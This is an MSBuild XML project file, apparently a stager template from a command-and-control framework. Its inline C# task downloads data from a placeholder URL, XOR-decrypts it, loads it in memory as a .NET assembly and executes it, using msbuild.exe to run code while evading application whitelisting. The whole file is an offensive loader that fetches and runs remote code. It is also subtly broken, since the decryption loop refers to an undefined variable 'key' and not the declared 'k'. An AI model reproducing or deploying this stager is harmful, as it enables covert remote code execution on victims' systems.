<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml -->
  <Target Name="Hello">
    <SharpLauncher >
    </SharpLauncher>
  </Target>
  <UsingTask
    TaskName="SharpLauncher"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
      <Using Namespace="System" />
      <Using Namespace="System.Net" />
  	  <Using Namespace="System.Reflection" />
      <Code Type="Fragment" Language="cs">
      <![CDATA[
        WebClient wc = new WebClient();
        IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
        if (defaultProxy != null) {
            defaultProxy.Credentials = CredentialCache.DefaultCredentials;
            wc.Proxy = defaultProxy;
        }
        byte[] b = wc.DownloadData("${stagePublicURL}");
        //string k = BitConverter.ToString(new SHA256CryptoServiceProvider().ComputeHash(Convert.FromBase64String("${masterKey}"))).Replace("-", string.Empty).ToLower();
        string k = "${xorKey}";
        for(int i = 0; i < b.Length; i++) { b[i] = (byte) (b[i] ^ key[i % key.Length]); }
        string[] parameters = new string[] {"${accessToken}", "${masterKey}"};
        object[] args = new object[] {parameters};
        Assembly a = Assembly.Load(b);
        MethodInfo method = a.EntryPoint;
        object o = a.CreateInstance(method.Name);
        method.Invoke(o, args);
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
